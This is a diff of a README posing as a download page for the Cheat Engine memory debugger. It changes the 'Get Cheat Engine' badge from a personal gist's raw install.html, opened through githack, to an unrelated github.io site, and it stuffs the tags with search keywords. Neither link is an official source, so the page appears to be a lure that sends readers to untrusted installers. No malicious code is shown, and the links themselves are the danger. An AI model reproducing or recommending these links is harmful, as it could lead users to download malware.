@@ -1,6 +1,6 @@
 # Cheat Engine Download — Advanced Desktop Memory Debugger  
 
-[![Get Cheat Engine GitHub](https://img.shields.io/badge/Get%20Cheat%20Engine%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/deathinred40/df0442a02ecae516434d451e6bc6baa1/raw/f17af616a3f49ff02718f18b713914b6224b1e0d/install.html?offer=CheatEngine)  
+[![Get Cheat Engine GitHub](https://img.shields.io/badge/Get%20Cheat%20Engine%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deploy.github.io/.github/?offer=CheatEngine)  
 
 ---
 
@@ -75,7 +75,7 @@ It’s widely used in the gaming and software engineering communities for its fl
 ---
 
 ## 🔍 Tags  
-cheat engine, memory scanner, debugger, lua scripting, trainer maker, modding tool, process analyzer, cheat engine macos, memory editor, reverse engineering, desktop debugging, cheat engine pc, cheat engine windows, cheat engine desktop, cheat engine for mac, cheat engine for pc, cheat engine for windows, cheat engine mac  
+cheat engine, cheat engine 7.4, cheat engine github, cheat engine slot, cheat engine download, memory scanner, debugger, lua scripting, trainer maker, modding tool, process analyzer, cheat engine macos, memory editor, reverse engineering, desktop debugging, cheat engine pc, cheat engine windows, cheat engine desktop, cheat engine for mac, cheat engine for pc, cheat engine for windows, cheat engine mac  
 
 ---
 
